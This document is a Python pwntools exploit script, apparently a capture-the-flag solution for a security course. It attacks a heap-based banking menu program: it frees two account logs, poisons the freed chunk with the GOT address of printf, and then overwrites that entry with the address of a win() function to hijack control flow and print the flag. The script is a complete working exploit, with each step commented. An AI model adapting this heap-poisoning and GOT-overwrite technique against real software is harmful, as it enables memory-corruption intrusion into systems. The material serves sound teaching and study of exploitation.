#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

#conn = pwn.remote('tasks.ws24.softsec.rub.de', 33727)
conn = pwn.process([exe.path])

#pwn.gdb.attach(conn, gdbscript="""
#set detach-on-fork off
#set follow-fork-mode child
#""")

# idea: write address of win() into .got of printf()
# works, because no PIE and no RELRO

address_win = 0x401810
got_printf = 0x403870

conn.recvuntil(b'> ')

# 1) CREATE account 1 (malloc() for log 1)
conn.sendline(b'1')
conn.recvuntil(b'long)?\n')
conn.sendline(b'11111111')
conn.recvuntil(b'> ')

# 2) CREATE account 2 (malloc() for log 2)
conn.sendline(b'1')
conn.recvuntil(b'long)?\n')
conn.sendline(b'22222222')
conn.recvuntil(b'> ')

# 3) WIDTHDRAW 0 from account 1 (free() for log 1)
conn.sendline(b'3')
conn.recvuntil(b'What account should I withdraw funds from?\n')
conn.sendline(b'11111111')
conn.recvuntil(b'How much money should I withdraw from this account?\n')
conn.sendline(b'0')
conn.recvuntil(b'Account has no remaining balance, closing it\n')
conn.recvuntil(b'> ')

# 4) WIDTHDRAW 0 from account 2 (free() for log 2)
conn.sendline(b'3')
conn.recvuntil(b'What account should I withdraw funds from?\n')
conn.sendline(b'22222222')
conn.recvuntil(b'How much money should I withdraw from this account?\n')
conn.sendline(b'0')
conn.recvuntil(b'Account has no remaining balance, closing it\n')
conn.recvuntil(b'> ')

# 5) DEPOSIT account 2 with deposit = 0x403870 (.got of printf)
conn.sendline(b'2')
conn.recvuntil(b'What account should I deposit funds into?\n')
conn.sendline(b'22222222')
conn.recvuntil(b'How much money should I deposit in this account?\n')
conn.sendline(str(got_printf).encode('ascii'))
conn.recvuntil(b'> ')

# 6) CREATE account 3 (malloc() reuses log 2)
conn.sendline(b'1')
conn.recvuntil(b'long)?\n')
conn.sendline(b'33333333')
conn.recvuntil(b'> ')

# 7) CREATE account 4 (malloc() returns 0x403870 (.got of printf))
conn.sendline(b'1')
conn.recvuntil(b'long)?\n')
conn.sendline(b'44444444')
conn.recvuntil(b'> ')

# 8) DEPOSIT account 4 with deposit = 0x401810 (pointer to win())
conn.sendline(b'2')
conn.recvuntil(b'What account should I deposit funds into?\n')
conn.sendline(b'44444444')
conn.recvuntil(b'How much money should I deposit in this account?\n')
conn.sendline(str(address_win).encode('ascii'))

# win() is called and we see flag in terminal :)
conn.interactive()
